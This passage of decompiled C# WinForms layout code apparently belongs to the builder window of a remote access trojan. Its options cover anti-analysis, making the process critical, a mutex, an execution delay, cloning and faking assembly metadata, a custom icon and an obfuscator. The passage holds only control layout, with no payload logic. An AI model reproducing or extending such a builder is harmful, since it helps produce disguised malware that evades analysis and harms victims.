		this.groupBox3.Location = new System.Drawing.Point(6, 17);
		this.groupBox3.Name = "groupBox3";
		this.groupBox3.Size = new System.Drawing.Size(585, 439);
		this.groupBox3.TabIndex = 9;
		this.groupBox3.TabStop = false;
		this.groupBox3.Text = "MISC";
		this.txtGroup.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Group", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtGroup.Location = new System.Drawing.Point(23, 75);
		this.txtGroup.Name = "txtGroup";
		this.txtGroup.Size = new System.Drawing.Size(301, 26);
		this.txtGroup.TabIndex = 17;
		this.txtGroup.Text = Server.Properties.Settings.Default.Group;
		this.label17.AutoSize = true;
		this.label17.Location = new System.Drawing.Point(19, 43);
		this.label17.Name = "label17";
		this.label17.Size = new System.Drawing.Size(54, 20);
		this.label17.TabIndex = 16;
		this.label17.Text = "Group";
		this.numDelay.Location = new System.Drawing.Point(27, 368);
		this.numDelay.Maximum = new decimal(new int[4] { 999, 0, 0, 0 });
		this.numDelay.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numDelay.Name = "numDelay";
		this.numDelay.Size = new System.Drawing.Size(84, 26);
		this.numDelay.TabIndex = 15;
		this.numDelay.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		this.label16.AutoSize = true;
		this.label16.Location = new System.Drawing.Point(23, 336);
		this.label16.Name = "label16";
		this.label16.Size = new System.Drawing.Size(123, 20);
		this.label16.TabIndex = 14;
		this.label16.Text = "Delay (seconds)";
		this.pictureBox1.Image = Server.Properties.Resources.uac;
		this.pictureBox1.Location = new System.Drawing.Point(183, 275);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(32, 32);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
		this.pictureBox1.TabIndex = 13;
		this.pictureBox1.TabStop = false;
		this.chkBdos.AutoSize = true;
		this.chkBdos.Location = new System.Drawing.Point(23, 283);
		this.chkBdos.Name = "chkBdos";
		this.chkBdos.Size = new System.Drawing.Size(143, 24);
		this.chkBdos.TabIndex = 12;
		this.chkBdos.Text = "Process Critical";
		this.chkBdos.UseVisualStyleBackColor = true;
		this.txtMutex.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Mutex", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtMutex.Location = new System.Drawing.Point(23, 163);
		this.txtMutex.Name = "txtMutex";
		this.txtMutex.Size = new System.Drawing.Size(301, 26);
		this.txtMutex.TabIndex = 11;
		this.txtMutex.Text = Server.Properties.Settings.Default.Mutex;
		this.label5.AutoSize = true;
		this.label5.Location = new System.Drawing.Point(19, 131);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(52, 20);
		this.label5.TabIndex = 10;
		this.label5.Text = "Mutex";
		this.chkAnti.AutoSize = true;
		this.chkAnti.Location = new System.Drawing.Point(23, 232);
		this.chkAnti.Name = "chkAnti";
		this.chkAnti.Size = new System.Drawing.Size(125, 24);
		this.chkAnti.TabIndex = 9;
		this.chkAnti.Text = "Anti Analysis";
		this.chkAnti.UseVisualStyleBackColor = true;
		this.tabControl1.Controls.Add(this.tabPage1);
		this.tabControl1.Controls.Add(this.tabPage2);
		this.tabControl1.Controls.Add(this.tabPage3);
		this.tabControl1.Controls.Add(this.tabPage4);
		this.tabControl1.Controls.Add(this.tabPage5);
		this.tabControl1.Controls.Add(this.tabPage6);
		this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabControl1.Location = new System.Drawing.Point(0, 0);
		this.tabControl1.Name = "tabControl1";
		this.tabControl1.SelectedIndex = 0;
		this.tabControl1.Size = new System.Drawing.Size(607, 497);
		this.tabControl1.TabIndex = 10;
		this.tabPage1.Controls.Add(this.groupBox1);
		this.tabPage1.Location = new System.Drawing.Point(4, 29);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(599, 464);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Connection";
		this.tabPage1.UseVisualStyleBackColor = true;
		this.tabPage2.Controls.Add(this.groupBox2);
		this.tabPage2.Location = new System.Drawing.Point(4, 29);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(599, 464);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Install";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.tabPage3.Controls.Add(this.groupBox3);
		this.tabPage3.Location = new System.Drawing.Point(4, 29);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(599, 464);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Misc";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.tabPage4.Controls.Add(this.groupBox4);
		this.tabPage4.Location = new System.Drawing.Point(4, 29);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(599, 464);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Assembly";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.groupBox4.Controls.Add(this.btnClone);
		this.groupBox4.Controls.Add(this.btnAssembly);
		this.groupBox4.Controls.Add(this.txtFileVersion);
		this.groupBox4.Controls.Add(this.txtProductVersion);
		this.groupBox4.Controls.Add(this.txtOriginalFilename);
		this.groupBox4.Controls.Add(this.txtTrademarks);
		this.groupBox4.Controls.Add(this.txtCopyright);
		this.groupBox4.Controls.Add(this.txtCompany);
		this.groupBox4.Controls.Add(this.label14);
		this.groupBox4.Controls.Add(this.label13);
		this.groupBox4.Controls.Add(this.label12);
		this.groupBox4.Controls.Add(this.label11);
		this.groupBox4.Controls.Add(this.label10);
		this.groupBox4.Controls.Add(this.label9);
		this.groupBox4.Controls.Add(this.txtDescription);
		this.groupBox4.Controls.Add(this.label7);
		this.groupBox4.Controls.Add(this.txtProduct);
		this.groupBox4.Controls.Add(this.label8);
		this.groupBox4.Location = new System.Drawing.Point(6, 17);
		this.groupBox4.Name = "groupBox4";
		this.groupBox4.Size = new System.Drawing.Size(585, 439);
		this.groupBox4.TabIndex = 8;
		this.groupBox4.TabStop = false;
		this.groupBox4.Text = "Assembly Information";
		this.btnClone.Enabled = false;
		this.btnClone.Location = new System.Drawing.Point(453, 43);
		this.btnClone.Name = "btnClone";
		this.btnClone.Size = new System.Drawing.Size(103, 38);
		this.btnClone.TabIndex = 21;
		this.btnClone.Text = "Clone";
		this.btnClone.UseVisualStyleBackColor = true;
		this.btnClone.Click += new System.EventHandler(BtnClone_Click);
		this.btnAssembly.AutoSize = true;
		this.btnAssembly.Location = new System.Drawing.Point(15, 29);
		this.btnAssembly.Name = "btnAssembly";
		this.btnAssembly.Size = new System.Drawing.Size(85, 24);
		this.btnAssembly.TabIndex = 20;
		this.btnAssembly.Text = "Enable";
		this.btnAssembly.UseVisualStyleBackColor = true;
		this.btnAssembly.CheckedChanged += new System.EventHandler(BtnAssembly_CheckedChanged);
		this.txtFileVersion.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtFileVersion", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtFileVersion.Enabled = false;
		this.txtFileVersion.Location = new System.Drawing.Point(159, 398);
		this.txtFileVersion.Name = "txtFileVersion";
		this.txtFileVersion.Size = new System.Drawing.Size(397, 26);
		this.txtFileVersion.TabIndex = 19;
		this.txtFileVersion.Text = Server.Properties.Settings.Default.txtFileVersion;
		this.txtProductVersion.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtProductVersion", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtProductVersion.Enabled = false;
		this.txtProductVersion.Location = new System.Drawing.Point(159, 356);
		this.txtProductVersion.Name = "txtProductVersion";
		this.txtProductVersion.Size = new System.Drawing.Size(397, 26);
		this.txtProductVersion.TabIndex = 18;
		this.txtProductVersion.Text = Server.Properties.Settings.Default.txtProductVersion;
		this.txtOriginalFilename.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtOriginalFilename", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtOriginalFilename.Enabled = false;
		this.txtOriginalFilename.Location = new System.Drawing.Point(159, 314);
		this.txtOriginalFilename.Name = "txtOriginalFilename";
		this.txtOriginalFilename.Size = new System.Drawing.Size(397, 26);
		this.txtOriginalFilename.TabIndex = 17;
		this.txtOriginalFilename.Text = Server.Properties.Settings.Default.txtOriginalFilename;
		this.txtTrademarks.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtTrademarks", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtTrademarks.Enabled = false;
		this.txtTrademarks.Location = new System.Drawing.Point(159, 272);
		this.txtTrademarks.Name = "txtTrademarks";
		this.txtTrademarks.Size = new System.Drawing.Size(397, 26);
		this.txtTrademarks.TabIndex = 16;
		this.txtTrademarks.Text = Server.Properties.Settings.Default.txtTrademarks;
		this.txtCopyright.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtCopyright", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtCopyright.Enabled = false;
		this.txtCopyright.Location = new System.Drawing.Point(159, 230);
		this.txtCopyright.Name = "txtCopyright";
		this.txtCopyright.Size = new System.Drawing.Size(397, 26);
		this.txtCopyright.TabIndex = 15;
		this.txtCopyright.Text = Server.Properties.Settings.Default.txtCopyright;
		this.txtCompany.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtCompany", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtCompany.Enabled = false;
		this.txtCompany.Location = new System.Drawing.Point(159, 188);
		this.txtCompany.Name = "txtCompany";
		this.txtCompany.Size = new System.Drawing.Size(397, 26);
		this.txtCompany.TabIndex = 14;
		this.txtCompany.Text = Server.Properties.Settings.Default.txtCompany;
		this.label14.AutoSize = true;
		this.label14.Location = new System.Drawing.Point(8, 359);
		this.label14.Name = "label14";
		this.label14.Size = new System.Drawing.Size(126, 20);
		this.label14.TabIndex = 13;
		this.label14.Text = "Product Version:";
		this.label13.AutoSize = true;
		this.label13.Location = new System.Drawing.Point(8, 401);
		this.label13.Name = "label13";
		this.label13.Size = new System.Drawing.Size(96, 20);
		this.label13.TabIndex = 12;
		this.label13.Text = "File Version:";
		this.label12.AutoSize = true;
		this.label12.Location = new System.Drawing.Point(8, 317);
		this.label12.Name = "label12";
		this.label12.Size = new System.Drawing.Size(135, 20);
		this.label12.TabIndex = 11;
		this.label12.Text = "Original Filename:";
		this.label11.AutoSize = true;
		this.label11.Location = new System.Drawing.Point(8, 275);
		this.label11.Name = "label11";
		this.label11.Size = new System.Drawing.Size(97, 20);
		this.label11.TabIndex = 10;
		this.label11.Text = "Trademarks:";
		this.label10.AutoSize = true;
		this.label10.Location = new System.Drawing.Point(8, 233);
		this.label10.Name = "label10";
		this.label10.Size = new System.Drawing.Size(80, 20);
		this.label10.TabIndex = 9;
		this.label10.Text = "Copyright:";
		this.label9.AutoSize = true;
		this.label9.Location = new System.Drawing.Point(8, 191);
		this.label9.Name = "label9";
		this.label9.Size = new System.Drawing.Size(80, 20);
		this.label9.TabIndex = 8;
		this.label9.Text = "Company:";
		this.txtDescription.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtDescription", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtDescription.Enabled = false;
		this.txtDescription.Location = new System.Drawing.Point(159, 146);
		this.txtDescription.Name = "txtDescription";
		this.txtDescription.Size = new System.Drawing.Size(397, 26);
		this.txtDescription.TabIndex = 7;
		this.txtDescription.Text = Server.Properties.Settings.Default.txtDescription;
		this.label7.AutoSize = true;
		this.label7.Location = new System.Drawing.Point(8, 149);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(93, 20);
		this.label7.TabIndex = 6;
		this.label7.Text = "Description:";
		this.txtProduct.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "ProductName", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtProduct.Enabled = false;
		this.txtProduct.Location = new System.Drawing.Point(159, 104);
		this.txtProduct.Name = "txtProduct";
		this.txtProduct.Size = new System.Drawing.Size(397, 26);
		this.txtProduct.TabIndex = 5;
		this.txtProduct.Text = Server.Properties.Settings.Default.ProductName;
		this.label8.AutoSize = true;
		this.label8.Location = new System.Drawing.Point(8, 107);
		this.label8.Name = "label8";
		this.label8.Size = new System.Drawing.Size(68, 20);
		this.label8.TabIndex = 4;
		this.label8.Text = "Product:";
		this.tabPage5.Controls.Add(this.groupBox5);
		this.tabPage5.Location = new System.Drawing.Point(4, 29);
		this.tabPage5.Name = "tabPage5";
		this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage5.Size = new System.Drawing.Size(599, 464);
		this.tabPage5.TabIndex = 4;
		this.tabPage5.Text = "Icon";
		this.tabPage5.UseVisualStyleBackColor = true;
		this.groupBox5.Controls.Add(this.chkIcon);
		this.groupBox5.Controls.Add(this.label15);
		this.groupBox5.Controls.Add(this.txtIcon);
		this.groupBox5.Controls.Add(this.btnIcon);
		this.groupBox5.Controls.Add(this.picIcon);
		this.groupBox5.Location = new System.Drawing.Point(6, 17);
		this.groupBox5.Name = "groupBox5";
		this.groupBox5.Size = new System.Drawing.Size(585, 439);
		this.groupBox5.TabIndex = 0;
		this.groupBox5.TabStop = false;
		this.groupBox5.Text = "Add Icon";
		this.chkIcon.AutoSize = true;
		this.chkIcon.Location = new System.Drawing.Point(15, 29);
		this.chkIcon.Name = "chkIcon";
		this.chkIcon.Size = new System.Drawing.Size(85, 24);
		this.chkIcon.TabIndex = 8;
		this.chkIcon.Text = "Enable";
		this.chkIcon.UseVisualStyleBackColor = true;
		this.chkIcon.CheckedChanged += new System.EventHandler(ChkIcon_CheckedChanged);
		this.label15.AutoSize = true;
		this.label15.Location = new System.Drawing.Point(11, 89);
		this.label15.Name = "label15";
		this.label15.Size = new System.Drawing.Size(42, 20);
		this.label15.TabIndex = 7;
		this.label15.Text = "Path";
		this.txtIcon.Enabled = false;
		this.txtIcon.Location = new System.Drawing.Point(15, 122);
		this.txtIcon.Name = "txtIcon";
		this.txtIcon.Size = new System.Drawing.Size(447, 26);
		this.txtIcon.TabIndex = 6;
		this.btnIcon.Enabled = false;
		this.btnIcon.Location = new System.Drawing.Point(485, 122);
		this.btnIcon.Name = "btnIcon";
		this.btnIcon.Size = new System.Drawing.Size(60, 26);
		this.btnIcon.TabIndex = 5;
		this.btnIcon.Text = " ";
		this.btnIcon.UseVisualStyleBackColor = true;
		this.btnIcon.Click += new System.EventHandler(BtnIcon_Click);
		this.picIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picIcon.ErrorImage = null;
		this.picIcon.InitialImage = null;
		this.picIcon.Location = new System.Drawing.Point(15, 171);
		this.picIcon.Name = "picIcon";
		this.picIcon.Size = new System.Drawing.Size(128, 128);
		this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picIcon.TabIndex = 4;
		this.picIcon.TabStop = false;
		this.tabPage6.Controls.Add(this.chkObfu);
		this.tabPage6.Controls.Add(this.btnBuild);
		this.tabPage6.Location = new System.Drawing.Point(4, 29);
		this.tabPage6.Name = "tabPage6";
		this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage6.Size = new System.Drawing.Size(599, 464);
		this.tabPage6.TabIndex = 5;
		this.tabPage6.Text = "Build";
		this.tabPage6.UseVisualStyleBackColor = true;
		this.chkObfu.AutoSize = true;
		this.chkObfu.Location = new System.Drawing.Point(18, 148);
		this.chkObfu.Name = "chkObfu";
		this.chkObfu.Size = new System.Drawing.Size(166, 24);
		this.chkObfu.TabIndex = 2;
		this.chkObfu.Text = "Simple Obfuscator";
		this.chkObfu.UseVisualStyleBackColor = true;
		this.btnBuild.Location = new System.Drawing.Point(18, 196);
		this.btnBuild.Name = "btnBuild";
		this.btnBuild.Size = new System.Drawing.Size(539, 49);
		this.btnBuild.TabIndex = 1;
		this.btnBuild.Text = "Build";
		this.btnBuild.UseVisualStyleBackColor = true;
		this.btnBuild.Click += new System.EventHandler(BtnBuild_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(607, 497);
		base.Controls.Add(this.tabControl1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormBuilder";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Builder";
		base.Load += new System.EventHandler(Builder_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		this.groupBox3.ResumeLayout(false);
		this.groupBox3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numDelay).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.tabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		this.tabPage2.ResumeLayout(false);
		this.tabPage3.ResumeLayout(false);
		this.tabPage4.ResumeLayout(false);
		this.groupBox4.ResumeLayout(false);
		this.groupBox4.PerformLayout();
		this.tabPage5.ResumeLayout(false);
		this.groupBox5.ResumeLayout(false);
		this.groupBox5.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.picIcon).EndInit();
		this.tabPage6.ResumeLayout(false);
		this.tabPage6.PerformLayout();
		base.ResumeLayout(false);
	}
}
